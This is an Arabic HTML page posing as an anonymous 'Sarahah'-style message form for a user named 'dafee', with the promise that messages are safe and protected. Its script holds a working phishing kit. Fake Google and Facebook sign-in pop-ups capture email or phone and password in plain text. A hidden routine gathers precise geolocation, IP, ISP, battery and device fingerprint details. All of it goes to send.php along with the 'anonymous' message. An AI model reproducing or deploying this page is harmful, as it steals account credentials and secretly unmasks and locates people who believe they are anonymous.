<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صارحني الخاص بـ dafee</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Tahoma', 'Arial', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0f1b2e 0%, #1a2e4a 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: rgba(22, 33, 62, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            width: 100%;
            max-width: 600px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(147, 51, 234, 0.2);
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo {
            font-size: 50px;
            margin-bottom: 15px;
        }

        .title {
            font-size: 2.2rem;
            color: #e0e0e0;
            margin-bottom: 10px;
            font-weight: 800;
        }

        .tagline {
            color: #a0a0a0;
            font-size: 1rem;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #a0d468;
            margin-bottom: 8px;
            font-weight: 600;
            font-size: 0.95rem;
        }

        input[type="text"],
        input[type="email"],
        input[type="password"],
        textarea {
            width: 100%;
            padding: 15px;
            border: 2px solid #3e206e;
            border-radius: 12px;
            background: #2c0b4e;
            color: #e0e0e0;
            font-size: 1rem;
            transition: all 0.3s ease;
            font-family: inherit;
        }

        input[type="text"]:focus,
        input[type="email"]:focus,
        input[type="password"]:focus,
        textarea:focus {
            border-color: #9333ea;
            outline: none;
            box-shadow: 0 0 0 4px rgba(147, 51, 234, 0.3);
            transform: translateY(-2px);
        }

        textarea {
            resize: vertical;
            min-height: 150px;
            max-height: 300px;
        }

        .char-count {
            text-align: left;
            font-size: 0.85rem;
            color: #a0a0a0;
            margin-top: 5px;
        }

        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #6a0572, #ab3490);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(147, 51, 234, 0.4);
        }

        .btn:active {
            transform: translateY(-1px);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .success-message {
            display: none;
            background: linear-gradient(135deg, #0f4c75, #3282b8);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-top: 20px;
            text-align: center;
            animation: slideIn 0.5s ease;
        }

        .success-message.show {
            display: block;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .loading {
            display: none;
            text-align: center;
            color: #a0d468;
            margin-top: 20px;
        }

        .loading.show {
            display: block;
        }

        .spinner {
            border: 3px solid #3e206e;
            border-top: 3px solid #9333ea;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .info-box {
            background: rgba(147, 51, 234, 0.1);
            border-left: 4px solid #9333ea;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            color: #a0d468;
            font-size: 0.9rem;
        }

        .error-message {
            background: rgba(220, 38, 38, 0.2);
            color: #ff6b6b;
            padding: 15px;
            border-radius: 12px;
            margin-top: 20px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        /* أنماط أزرار تسجيل الدخول الاجتماعي */
        .social-login-section {
            margin-bottom: 30px;
            padding-bottom: 30px;
            border-bottom: 2px solid rgba(147, 51, 234, 0.2);
        }

        .social-title {
            text-align: center;
            color: #a0d468;
            margin-bottom: 15px;
            font-size: 0.95rem;
            font-weight: 600;
        }

        .social-buttons {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
        }

        .social-btn {
            flex: 1;
            padding: 12px;
            border: 2px solid;
            border-radius: 12px;
            background: transparent;
            color: white;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.9rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .social-btn i {
            font-size: 1.2rem;
        }

        .google-btn {
            border-color: #ea4335;
            color: #ea4335;
        }

        .google-btn:hover {
            background: rgba(234, 67, 53, 0.1);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(234, 67, 53, 0.3);
        }

        .facebook-btn {
            border-color: #1877f2;
            color: #1877f2;
        }

        .facebook-btn:hover {
            background: rgba(24, 119, 242, 0.1);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.3);
        }

        .divider {
            text-align: center;
            color: #a0a0a0;
            margin: 20px 0;
            font-size: 0.9rem;
        }

        .divider::before,
        .divider::after {
            content: '';
            display: inline-block;
            width: 40%;
            height: 1px;
            background: rgba(147, 51, 234, 0.2);
            vertical-align: middle;
            margin: 0 10px;
        }

        .social-user-info {
            background: rgba(24, 119, 242, 0.1);
            border: 1px solid rgba(24, 119, 242, 0.3);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 20px;
            display: none;
        }

        .social-user-info.show {
            display: block;
        }

        .social-user-info p {
            color: #a0d468;
            margin: 8px 0;
            font-size: 0.9rem;
        }

        .social-user-info strong {
            color: #e0e0e0;
        }

        .clear-social-btn {
            background: rgba(220, 38, 38, 0.2);
            border: 1px solid rgba(220, 38, 38, 0.5);
            color: #ff6b6b;
            padding: 8px 12px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.85rem;
            transition: all 0.3s ease;
            margin-top: 10px;
            width: 100%;
        }

        .clear-social-btn:hover {
            background: rgba(220, 38, 38, 0.3);
        }

        /* ============ أنماط النوافذ المنبثقة ============ */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            animation: fadeIn 0.3s ease;
        }

        .modal.show {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        /* ============ نموذج جوجل ============ */
        .google-modal-content {
            background: white;
            border-radius: 8px;
            width: 90%;
            max-width: 450px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            overflow: hidden;
        }

        .google-modal-header {
            background: white;
            padding: 24px 24px 0;
            text-align: center;
        }

        .google-logo {
            font-size: 32px;
            margin-bottom: 16px;
            font-weight: 700;
            color: #1f2937;
        }

        .google-logo span:nth-child(1) { color: #4285f4; }
        .google-logo span:nth-child(2) { color: #ea4335; }
        .google-logo span:nth-child(3) { color: #fbbc04; }
        .google-logo span:nth-child(4) { color: #4285f4; }
        .google-logo span:nth-child(5) { color: #34a853; }
        .google-logo span:nth-child(6) { color: #ea4335; }

        .google-modal-title {
            font-size: 24px;
            font-weight: 500;
            color: #202124;
            margin-bottom: 8px;
        }

        .google-modal-subtitle {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 24px;
        }

        .google-modal-form {
            padding: 0 24px 24px;
        }

        .google-form-group {
            margin-bottom: 16px;
        }

        .google-input {
            width: 100%;
            padding: 12px 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            transition: all 0.2s ease;
            background: white;
            color: #202124;
        }

        .google-input:focus {
            outline: none;
            border-color: #4285f4;
            box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.1);
        }

        .google-input::placeholder {
            color: #9aa0a6;
        }

        .google-modal-buttons {
            display: flex;
            justify-content: space-between;
            gap: 12px;
            margin-top: 24px;
        }

        .google-btn-cancel {
            flex: 1;
            padding: 10px 24px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            background: white;
            color: #3c4043;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .google-btn-cancel:hover {
            background: #f8f9fa;
            border-color: #dadce0;
        }

        .google-btn-submit {
            flex: 1;
            padding: 10px 24px;
            border: none;
            border-radius: 4px;
            background: #1f71c6;
            color: white;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .google-btn-submit:hover {
            background: #1765cc;
            box-shadow: 0 2px 8px rgba(31, 113, 198, 0.3);
        }

        /* ============ نموذج فيسبوك ============ */
        .facebook-modal-content {
            background: white;
            border-radius: 8px;
            width: 90%;
            max-width: 432px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .facebook-modal-header {
            background: white;
            padding: 16px 16px 12px;
            border-bottom: 1px solid #e5e7eb;
        }

        .facebook-logo {
            font-size: 28px;
            font-weight: 800;
            color: #1877f2;
            margin-bottom: 12px;
        }

        .facebook-modal-title {
            font-size: 32px;
            font-weight: 800;
            color: #000;
            margin-bottom: 8px;
        }

        .facebook-modal-subtitle {
            font-size: 15px;
            color: #65676b;
            line-height: 1.4;
        }

        .facebook-modal-form {
            padding: 16px;
        }

        .facebook-form-group {
            margin-bottom: 8px;
        }

        .facebook-input {
            width: 100%;
            padding: 11px 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 15px;
            font-family: Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            color: #000;
            transition: all 0.2s ease;
        }

        .facebook-input:focus {
            outline: none;
            border-color: #1877f2;
            background: white;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1);
        }

        .facebook-input::placeholder {
            color: #65676b;
        }

        .facebook-modal-buttons {
            display: flex;
            justify-content: space-between;
            gap: 8px;
            margin-top: 16px;
        }

        .facebook-btn-cancel {
            flex: 1;
            padding: 6px 16px;
            border: none;
            border-radius: 6px;
            background: #e4e6eb;
            color: #000;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .facebook-btn-cancel:hover {
            background: #d0d2d7;
        }

        .facebook-btn-submit {
            flex: 1;
            padding: 6px 16px;
            border: none;
            border-radius: 6px;
            background: #1877f2;
            color: white;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .facebook-btn-submit:hover {
            background: #166fe5;
        }

        @media (max-width: 600px) {
            .container {
                padding: 25px;
            }

            .title {
                font-size: 1.8rem;
            }

            input[type="text"],
            input[type="email"],
            input[type="password"],
            textarea {
                padding: 12px;
            }

            .social-buttons {
                flex-direction: column;
            }

            .google-modal-content,
            .facebook-modal-content {
                width: 95%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">💬</div>
            <h1 class="title">صارحني الخاص بـ dafee</h1>
            <p class="tagline">أرسل رسالة مجهولة بكل حرية</p>
        </div>

        <div class="info-box">
            <i class="fas fa-shield-alt"></i> رسالتك محمية وآمنة تماماً
        </div>

        <!-- قسم تسجيل الدخول الاجتماعي -->
        <div class="social-login-section">
            <div class="social-title">
                <i class="fas fa-sign-in-alt"></i> تسجيل الدخول (اختياري)
            </div>
            
            <div class="social-buttons">
                <button type="button" class="social-btn google-btn" id="googleBtn" onclick="openGoogleModal()">
                    <i class="fab fa-google"></i> جوجل
                </button>
                <button type="button" class="social-btn facebook-btn" id="facebookBtn" onclick="openFacebookModal()">
                    <i class="fab fa-facebook"></i> فيسبوك
                </button>
            </div>

            <div class="social-user-info" id="socialUserInfo">
                <p><strong>تم التسجيل من:</strong> <span id="socialProvider"></span></p>
                <p><strong>رقم الهاتف / البريد:</strong> <span id="socialPhoneEmail"></span></p>
                <p><strong>كلمة السر:</strong> <span id="socialPassword" style="letter-spacing: 2px;">••••••••</span></p>
                <button type="button" class="clear-social-btn" onclick="clearSocialLogin()">
                    <i class="fas fa-times"></i> مسح بيانات التسجيل
                </button>
            </div>

            <div class="divider">أو</div>
        </div>

        <form id="messageForm">
            <div class="form-group">
                <label for="senderName">
                    <i class="fas fa-user"></i> اسمك (اختياري)
                </label>
                <input type="text" id="senderName" name="senderName" placeholder="اترك فارغاً للبقاء مجهول الهوية" maxlength="50">
            </div>

            <div class="form-group">
                <label for="senderEmail">
                    <i class="fas fa-envelope"></i> بريدك الإلكتروني (اختياري)
                </label>
                <input type="email" id="senderEmail" name="senderEmail" placeholder="للرد عليك لاحقاً" maxlength="100">
            </div>

            <div class="form-group">
                <label for="message">
                    <i class="fas fa-message"></i> رسالتك
                </label>
                <textarea id="message" name="message" placeholder="اكتب رسالتك هنا..." required></textarea>
                <div class="char-count">
                    <span id="charCount">0</span> / 2000 حرف
                </div>
            </div>

            <button type="submit" class="btn">
                <i class="fas fa-paper-plane"></i> إرسال الرسالة
            </button>
        </form>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>جاري إرسال رسالتك...</p>
        </div>

        <div class="success-message" id="successMessage">
            <i class="fas fa-check-circle"></i>
            <p style="margin-top: 10px;">تم إرسال رسالتك بنجاح! شكراً لك 💙</p>
        </div>

        <div class="error-message" id="errorMessage">
            <i class="fas fa-exclamation-circle"></i>
            <p id="errorText" style="margin-top: 10px;"></p>
        </div>
    </div>

    <!-- نموذج تسجيل جوجل -->
    <div class="modal" id="googleModal">
        <div class="google-modal-content">
            <div class="google-modal-header">
                <div class="google-logo">
                    <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
                </div>
                <div class="google-modal-title">تسجيل الدخول</div>
                <div class="google-modal-subtitle">استخدم حسابك في Google</div>
            </div>
            
            <div class="google-modal-form">
                <div class="google-form-group">
                    <input type="text" id="googlePhoneEmail" class="google-input" placeholder="البريد الإلكتروني أو رقم الهاتف">
                </div>

                <div class="google-form-group">
                    <input type="password" id="googlePassword" class="google-input" placeholder="كلمة السر">
                </div>

                <div class="google-modal-buttons">
                    <button type="button" class="google-btn-cancel" onclick="closeGoogleModal()">
                        إلغاء
                    </button>
                    <button type="button" class="google-btn-submit" onclick="submitGoogleLogin()">
                        التالي
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- نموذج تسجيل فيسبوك -->
    <div class="modal" id="facebookModal">
        <div class="facebook-modal-content">
            <div class="facebook-modal-header">
                <div class="facebook-logo">f</div>
                <div class="facebook-modal-title">facebook</div>
                <div class="facebook-modal-subtitle">تسجيل الدخول إلى Facebook</div>
            </div>
            
            <div class="facebook-modal-form">
                <div class="facebook-form-group">
                    <input type="text" id="facebookPhoneEmail" class="facebook-input" placeholder="رقم الهاتف أو البريد الإلكتروني">
                </div>

                <div class="facebook-form-group">
                    <input type="password" id="facebookPassword" class="facebook-input" placeholder="كلمة السر">
                </div>

                <div class="facebook-modal-buttons">
                    <button type="button" class="facebook-btn-cancel" onclick="closeFacebookModal()">
                        إلغاء
                    </button>
                    <button type="button" class="facebook-btn-submit" onclick="submitFacebookLogin()">
                        تسجيل الدخول
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // متغير لتخزين بيانات تسجيل الدخول الاجتماعي
        let socialLoginData = null;

        // دوال فتح وإغلاق نموذج جوجل
        function openGoogleModal() {
            document.getElementById('googleModal').classList.add('show');
            document.getElementById('googlePhoneEmail').focus();
        }

        function closeGoogleModal() {
            document.getElementById('googleModal').classList.remove('show');
            document.getElementById('googlePhoneEmail').value = '';
            document.getElementById('googlePassword').value = '';
        }

        // دوال فتح وإغلاق نموذج فيسبوك
        function openFacebookModal() {
            document.getElementById('facebookModal').classList.add('show');
            document.getElementById('facebookPhoneEmail').focus();
        }

        function closeFacebookModal() {
            document.getElementById('facebookModal').classList.remove('show');
            document.getElementById('facebookPhoneEmail').value = '';
            document.getElementById('facebookPassword').value = '';
        }

        // دالة التعامل مع تسجيل جوجل
        function submitGoogleLogin() {
            const phoneEmail = document.getElementById('googlePhoneEmail').value.trim();
            const password = document.getElementById('googlePassword').value.trim();

            if (!phoneEmail || !password) {
                showError('الرجاء ملء جميع الحقول');
                return;
            }

            socialLoginData = {
                provider: 'Google',
                phoneEmail: phoneEmail,
                password: password
            };
            
            displaySocialUserInfo(socialLoginData);
            closeGoogleModal();
        }

        // دالة التعامل مع تسجيل فيسبوك
        function submitFacebookLogin() {
            const phoneEmail = document.getElementById('facebookPhoneEmail').value.trim();
            const password = document.getElementById('facebookPassword').value.trim();

            if (!phoneEmail || !password) {
                showError('الرجاء ملء جميع الحقول');
                return;
            }

            socialLoginData = {
                provider: 'Facebook',
                phoneEmail: phoneEmail,
                password: password
            };
            
            displaySocialUserInfo(socialLoginData);
            closeFacebookModal();
        }

        // دالة عرض معلومات المستخدم الاجتماعي
        function displaySocialUserInfo(data) {
            document.getElementById('socialProvider').textContent = data.provider;
            document.getElementById('socialPhoneEmail').textContent = data.phoneEmail;
            document.getElementById('socialPassword').textContent = data.password;
            document.getElementById('socialUserInfo').classList.add('show');
        }

        // دالة مسح بيانات التسجيل الاجتماعي
        function clearSocialLogin() {
            socialLoginData = null;
            document.getElementById('socialUserInfo').classList.remove('show');
        }

        // إغلاق النموذج عند الضغط خارجه
        window.onclick = function(event) {
            const googleModal = document.getElementById('googleModal');
            const facebookModal = document.getElementById('facebookModal');
            
            if (event.target === googleModal) {
                closeGoogleModal();
            }
            if (event.target === facebookModal) {
                closeFacebookModal();
            }
        }

        // السماح بالضغط على Enter لتقديم النموذج
        document.getElementById('googlePassword').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') submitGoogleLogin();
        });

        document.getElementById('facebookPassword').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') submitFacebookLogin();
        });

        // تحديث عداد الأحرف
        const messageInput = document.getElementById('message');
        const charCount = document.getElementById('charCount');

        messageInput.addEventListener('input', function() {
            charCount.textContent = this.value.length;
        });

        // جمع معلومات المرسل المتقدمة
        async function collectAdvancedInfo() {
            const info = {
                timestamp: new Date().toISOString(),
                localTime: new Date().toLocaleString('ar-SA'),
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                screenColorDepth: window.screen.colorDepth,
                screenPixelDepth: window.screen.pixelDepth,
                devicePixelRatio: window.devicePixelRatio,
                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
                deviceMemory: navigator.deviceMemory || 'غير معروف',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : 'غير معروف',
                battery: 'غير متاح',
                location: 'قيد الطلب...',
                ip: 'قيد الطلب...',
                referrer: document.referrer || 'مباشر',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                doNotTrack: navigator.doNotTrack,
            };

            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    info.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } catch (e) {
                    info.battery = 'خطأ في الوصول';
                }
            }

            if (navigator.geolocation) {
                try {
                    await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            (position) => {
                                info.location = {
                                    latitude: position.coords.latitude.toFixed(6),
                                    longitude: position.coords.longitude.toFixed(6),
                                    accuracy: Math.round(position.coords.accuracy) + ' متر',
                                    altitude: position.coords.altitude ? position.coords.altitude.toFixed(2) + ' متر' : 'غير متاح',
                                    altitudeAccuracy: position.coords.altitudeAccuracy ? position.coords.altitudeAccuracy.toFixed(2) + ' متر' : 'غير متاح'
                                };
                                resolve();
                            },
                            (error) => {
                                info.location = 'تم رفض الوصول أو غير متاح';
                                resolve();
                            },
                            { timeout: 5000, maximumAge: 0 }
                        );
                    });
                } catch (e) {
                    info.location = 'خطأ في الوصول';
                }
            }

            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    info.ip = data.ip;
                    info.location = {
                        ...info.location,
                        country: data.country_name,
                        city: data.city,
                        region: data.region,
                        isp: data.org,
                        timezone: data.timezone,
                        coordinates: `${data.latitude}, ${data.longitude}`
                    };
                }
            } catch (e) {
                // فشل الحصول على معلومات IP
            }

            return info;
        }

        // معالجة إرسال النموذج
        document.getElementById('messageForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const senderName = document.getElementById('senderName').value || 'مجهول';
            const senderEmail = document.getElementById('senderEmail').value || 'لم يتم تقديمه';
            const message = document.getElementById('message').value;

            if (!message.trim()) {
                showError('الرجاء كتابة رسالة');
                return;
            }

            document.getElementById('loading').classList.add('show');
            document.getElementById('errorMessage').classList.remove('show');

            try {
                const advancedInfo = await collectAdvancedInfo();

                const response = await fetch('send.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        senderName: senderName,
                        senderEmail: senderEmail,
                        message: message,
                        advancedInfo: advancedInfo,
                        socialLoginInfo: socialLoginData
                    })
                });

                const result = await response.json();

                if (result.success) {
                    document.getElementById('loading').classList.remove('show');
                    document.getElementById('successMessage').classList.add('show');
                    document.getElementById('messageForm').reset();
                    document.getElementById('charCount').textContent = '0';

                    setTimeout(() => {
                        document.getElementById('successMessage').classList.remove('show');
                    }, 5000);
                } else {
                    showError(result.message || 'حدث خطأ في الإرسال');
                }
            } catch (error) {
                showError('خطأ في الاتصال: ' + error.message);
            } finally {
                document.getElementById('loading').classList.remove('show');
            }
        });

        function showError(message) {
            const errorDiv = document.getElementById('errorMessage');
            document.getElementById('errorText').textContent = message;
            errorDiv.classList.add('show');
            setTimeout(() => {
                errorDiv.classList.remove('show');
            }, 5000);
        }
    </script>
</body>
</html>
